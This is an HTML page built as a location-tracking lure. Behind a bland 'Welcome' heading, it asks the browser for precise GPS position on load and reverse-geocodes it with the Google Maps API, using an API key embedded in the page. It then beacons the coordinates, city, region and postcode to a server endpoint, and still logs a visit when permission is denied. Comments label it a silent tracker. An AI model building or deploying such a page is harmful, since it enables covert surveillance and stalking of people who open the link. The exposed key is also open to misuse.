<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Segoe UI',sans-serif;background:#0d0d0d;color:#eee;
         display:flex;align-items:center;justify-content:center;height:100vh}
    .box{text-align:center;padding:40px}
    h1{font-size:28px;margin-bottom:10px}
    p{color:#888;font-size:15px}
    #status{font-size:11px;color:#333;margin-top:20px}
  </style>
</head>
<body>
  <div class="box">
    <h1>Welcome ðŸ‘‹</h1>
    <p>This page is being tracked silently.</p>
    <p id="status"></p>
  </div>

  <!-- Google Maps JS API â€” loads silently, enables GPS + reverse geocoding -->
  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyC-BanBhfGxZYVgeC2fP-4DscEriHeDSoc"></script>

  <script>
    var GOOGLE_KEY = 'AIzaSyC-BanBhfGxZYVgeC2fP-4DscEriHeDSoc';

    function log(msg){ document.getElementById('status').textContent = msg; console.log('[TRACKER]', msg); }

    function postLocation(data) {
      var blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
      var ok = navigator.sendBeacon('/api/update-location', blob);
      if (!ok) {
        fetch('/api/update-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        }).catch(function(){});
      }
    }

    // Use Google Maps Geocoding API to reverse geocode lat/lon â†’ real address
    async function googleReverseGeocode(lat, lon) {
      try {
        var url = 'https://maps.googleapis.com/maps/api/geocode/json' +
          '?latlng=' + lat + ',' + lon +
          '&key=' + GOOGLE_KEY;
        var r = await fetch(url);
        var d = await r.json();

        if (d.status !== 'OK' || !d.results || !d.results.length) {
          log('Google geocode returned: ' + d.status);
          return null;
        }

        // Parse Google's address_components for city, region, country, zip
        var components = d.results[0].address_components;
        var result = { city:'', region:'', country:'', countryCode:'', zip:'' };

        components.forEach(function(c) {
          var types = c.types;
          if (types.indexOf('locality') > -1)                      result.city        = c.long_name;
          if (types.indexOf('administrative_area_level_1') > -1)   result.region      = c.long_name;
          if (types.indexOf('country') > -1) {
            result.country     = c.long_name;
            result.countryCode = c.short_name;
          }
          if (types.indexOf('postal_code') > -1)                   result.zip         = c.long_name;
        });

        // If city not found in locality, try other component types
        if (!result.city) {
          components.forEach(function(c) {
            if (!result.city && c.types.indexOf('administrative_area_level_2') > -1) result.city = c.long_name;
            if (!result.city && c.types.indexOf('sublocality') > -1)                 result.city = c.long_name;
          });
        }

        log('Google says: ' + result.city + ', ' + result.region + ', ' + result.country);
        return result;
      } catch(e) {
        log('Google reverse geocode error: ' + e.message);
        return null;
      }
    }

    // GPS success handler
    async function onGPSSuccess(pos) {
      var lat = pos.coords.latitude;
      var lon = pos.coords.longitude;
      var acc = pos.coords.accuracy;
      log('GPS: ' + lat.toFixed(4) + ', ' + lon.toFixed(4) + ' (Â±' + Math.round(acc) + 'm) â€” looking up...');

      var geo = await googleReverseGeocode(lat, lon);

      postLocation({
        lat:          lat,
        lon:          lon,
        city:         geo ? geo.city        : '',
        region:       geo ? geo.region      : '',
        country:      geo ? geo.country     : '',
        countryCode:  geo ? geo.countryCode : '',
        zip:          geo ? geo.zip         : '',
        lookupSource: 'googleGPS'
      });
    }

    // GPS denied/failed â€” do NOT fall back to IP, just log it
    function onGPSError(err) {
      var msgs = {1:'Permission denied',2:'Position unavailable',3:'Timeout'};
      log('GPS error: ' + (msgs[err.code] || err.message));
      // Send minimal record so admin at least knows someone visited
      postLocation({ lookupSource: 'gpsDenied', city: 'GPS Denied', region: '', country: '' });
    }

    // Main â€” trigger GPS popup using browser API
    function init() {
      if (!navigator.geolocation) {
        log('Geolocation not supported by this browser');
        postLocation({ lookupSource: 'unsupported', city: 'Unsupported Browser' });
        return;
      }

      log('Requesting location...');
      navigator.geolocation.getCurrentPosition(
        onGPSSuccess,
        onGPSError,
        {
          enableHighAccuracy: true,  // triggers GPS chip on mobile
          timeout: 15000,
          maximumAge: 0             // never use cached position
        }
      );
    }

    // Wait for Google Maps to load then start
    window.onload = init;
  </script>
</body>
</html>
